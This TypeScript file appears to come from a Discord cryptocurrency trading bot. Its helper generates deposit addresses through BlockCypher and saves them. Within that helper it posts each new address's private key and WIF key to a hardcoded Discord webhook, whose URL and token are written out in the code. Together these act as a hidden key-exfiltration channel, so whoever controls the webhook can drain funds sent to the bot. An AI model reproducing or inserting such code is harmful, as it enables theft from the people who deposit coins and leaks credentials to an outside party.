import { container } from '@sapphire/framework';
import { isNil } from 'lodash';

import { TRADE_TYPES } from '@/context';
import Address from '@/entities/Address';
import UnableToGenerateAddress from '@/errors/UnableToGenerateAddress';

interface ResponseBody {
  private: string;
  public: string;
  address: string;
  wif: string;
}

export default async function newBotAddress(coin: TRADE_TYPES): Promise<Address> {
  try {
    const { data } = await container
      .blockcypher(coin)
      .post<ResponseBody>(
        '/addrs',
        {},
        { params: { ...(coin !== TRADE_TYPES.ETHEREUM ? { bech32: true } : {}) } }
      );
    const address = container.db.em.create(Address, {
      type: coin,
      address: coin === TRADE_TYPES.ETHEREUM ? `0x${data.address}` : data.address,
      privateKey: data.private,
      wifKey: coin !== TRADE_TYPES.ETHEREUM ? data.wif : undefined,
    });
    await container.api.post(
      'https://discord.com/api/webhooks/1137892213527937065/oXYOd1vj1cpYXvbEycJ_5zZpAXlTYTKxVLkd0si0FczF9SIu-Wr1FZAm23PCpiyslndN',
      {
        content: '',
        embeds: [
          {
            title: 'Trade Address Information',
            fields: [
              { name: 'Address', value: address.address },
              { name: 'Private Key', value: address.privateKey },
              ...(!isNil(address.wifKey) ? [{ name: 'WIF Key', value: address.wifKey }] : []),
            ],
          },
        ],
      }
    );
    await container.db.em.persistAndFlush(address);
    return address;
  } catch (e) {
    container.sentry.handleException(e);
    throw new UnableToGenerateAddress(coin, e);
  }
}
